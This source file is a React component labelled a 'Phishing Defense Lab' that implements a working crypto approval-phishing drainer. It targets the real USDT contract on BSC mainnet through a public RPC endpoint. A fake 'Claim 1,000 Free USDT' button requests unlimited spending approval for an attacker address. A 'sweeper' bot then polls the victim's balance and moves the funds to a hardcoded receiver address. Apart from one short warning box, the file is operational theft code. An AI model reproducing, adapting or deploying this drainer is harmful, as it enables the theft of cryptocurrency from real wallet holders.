"use client";

import React, { useState } from 'react';
import { ethers } from 'ethers';

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)"
];

// BSC Mainnet USDT Address
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

export default function PhishingDemo() {
  const [logs, setLogs] = useState<string[]>([]);
  const [isMonitoring, setIsMonitoring] = useState(false);
  const [targetAmount, setTargetAmount] = useState<string>("10");
  
  // --- CONFIGURATION ---
  // The Private Key for the "Attacker" wallet (MetaMask A)
  const ADMIN_PRIVATE_KEY = "PASTE_NEW_PRIVATE_KEY_HERE"; 
  // The Public Address of the Attacker wallet (derived from the key above)
  const ADMIN_PUBLIC_ADDRESS = "0x_ATTACKER_PUBLIC_ADDRESS";
  // The Public Address where the funds will land (MetaMask B)
  const RECEIVER_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1";
  // The Public Address of the Trust Wallet (The Victim)
  const VICTIM_WALLET_ADDRESS = "0x_TRUST_WALLET_ADDRESS";

  const addLog = (msg: string) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 10)]);
  };

  // --- VICTIM SIDE: The "Trap" ---
  async function simulateVictimApproval() {
    try {
      if (!(window as any).ethereum) return alert("Please install MetaMask to simulate victim behavior");
      const provider = new ethers.providers.Web3Provider((window as any).ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);

      addLog("Victim: Attempting to 'Claim Airdrop'...");
      
      // The phish: Victim approves the ATTACKER to spend their USDT
      const tx = await contract.approve(
        ADMIN_PUBLIC_ADDRESS, 
        ethers.constants.MaxUint256
      );
      
      addLog(`Victim: Approval pending...`);
      await tx.wait();
      addLog("Victim: Unlimited Approval Granted to Attacker.");
    } catch (err: any) {
      addLog(`Victim Error: ${err.message.slice(0, 50)}`);
    }
  }

  // --- ATTACKER SIDE: The Sweeper ---
  async function startMonitoring() {
    try {
      const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
      const attackerWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, attackerWallet);

      setIsMonitoring(true);
      addLog("Attacker Bot: Monitoring started...");

      const interval = setInterval(async () => {
        try {
          const balance = await contract.balanceOf(VICTIM_WALLET_ADDRESS);
          const threshold = ethers.utils.parseUnits(targetAmount, 18);

          if (balance.gte(threshold)) {
            addLog(`Target reached! ${ethers.utils.formatUnits(balance, 18)} USDT found in Victim wallet.`);
            
            // The Steal: Moving from Victim -> Receiver using Attacker's permission
            const tx = await contract.transferFrom(VICTIM_WALLET_ADDRESS, RECEIVER_ADDRESS, balance, {
              gasPrice: (await provider.getGasPrice()).mul(2)
            });

            addLog(`Sweep Executed: ${tx.hash}`);
            await tx.wait();
            addLog("Success: Funds moved to Receiver.");
            clearInterval(interval);
            setIsMonitoring(false);
          }
        } catch (err: any) {
          addLog(`Scanning Victim Balance...`);
        }
      }, 5000);
    } catch (err: any) {
      addLog(`Attacker Error: ${err.message}`);
    }
  }

  return (
    <div className="p-8 max-w-3xl mx-auto space-y-8 bg-white shadow-xl rounded-2xl my-10 border border-gray-100">
      <h1 className="text-3xl font-bold text-red-600 border-b pb-4">🛡️ Phishing Defense Lab</h1>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        {/* SECTION 1: THE TRAP */}
        <div className="p-6 border-2 border-dashed border-blue-200 rounded-xl bg-blue-50">
          <h2 className="font-bold text-blue-800 mb-2">Step 1: The Trap</h2>
          <p className="text-xs text-blue-600 mb-4 font-medium">Victim connects wallet to 'Claim'</p>
          <button 
            onClick={simulateVictimApproval}
            className="bg-blue-600 text-white px-6 py-3 rounded-lg font-bold hover:bg-blue-700 w-full transition-all shadow-lg active:scale-95"
          >
            🎁 Claim 1,000 Free USDT
          </button>
        </div>

        {/* SECTION 2: THE BOT */}
        <div className="p-6 bg-gray-900 text-white rounded-xl shadow-2xl">
          <h2 className="font-bold mb-4 text-green-400">Step 2: Attacker Panel</h2>
          <div className="space-y-4">
            <div>
              <label className="block text-[10px] text-gray-400 uppercase font-bold mb-1">Threshold (USDT)</label>
              <input 
                type="number" 
                value={targetAmount}
                onChange={(e) => setTargetAmount(e.target.value)}
                className="w-full p-2 bg-gray-800 border border-gray-700 rounded text-green-400 focus:outline-none focus:border-green-500"
              />
            </div>
            <button 
              onClick={startMonitoring}
              disabled={isMonitoring}
              className="w-full bg-green-600 py-3 rounded-lg font-bold hover:bg-green-700 transition-all disabled:opacity-50 disabled:bg-gray-700"
            >
              {isMonitoring ? "📡 SCANNING..." : "LAUNCH BOT"}
            </button>
          </div>
        </div>
      </div>

      {/* LOGS */}
      <div className="bg-black p-4 rounded-lg h-48 overflow-y-auto font-mono text-xs text-green-400 border-2 border-gray-800">
        <div className="text-gray-500 mb-2 border-b border-gray-800 pb-1 underline">SYSTEM_LOG_OUTPUT</div>
        {logs.map((log, i) => <div key={i} className="mb-1">{log}</div>)}
      </div>

      <div className="bg-red-50 p-4 rounded-lg border border-red-200">
        <h3 className="font-bold text-red-800 text-sm">How to protect yourself?</h3>
        <p className="text-xs text-red-700 mt-1">
          Never "Approve" a transaction on a site you don't trust. 
          The <strong>Approve</strong> button is a digital blank check. If you see it on an airdrop site, it is a scam.
        </p>
      </div>
    </div>
  );
}
